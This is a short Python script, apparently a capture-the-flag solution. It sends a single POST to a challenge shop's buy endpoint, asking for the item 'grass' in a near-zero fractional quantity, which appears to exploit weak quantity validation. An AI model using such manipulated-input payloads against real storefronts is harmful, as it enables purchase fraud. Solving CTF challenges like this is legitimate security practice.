import requests

URL = "https://fruit-store-b25f5b9a37998435.tjc.tf/"

req = requests.post(URL + "api/v1/buy", json={"fruit": "grass", "quantity": 0.00000000000000000000000000001})
print(req.text)
